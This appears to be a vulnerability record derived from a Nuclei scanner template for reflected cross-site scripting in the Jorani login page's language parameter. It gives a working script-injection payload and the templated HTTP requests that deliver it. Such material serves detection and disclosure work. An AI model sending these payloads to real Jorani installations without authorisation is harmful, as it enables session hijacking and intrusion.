# Vulnerability: Jorani v1.0.3-2014-2023 Benjamin BALET - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`jorani-benjamin-xss.yaml`)

## Description
The value of the `language request` parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload 75943";alert(1)//569 was submitted in the language parameter. This input was echoed unmodified in the application's response. The attacker can modify the token session and he can discover sensitive information for the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /session/login HTTP/1.1
Host: {{Hostname}}

POST /session/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ennois&login={{randstr}}&CipheredValue=
```

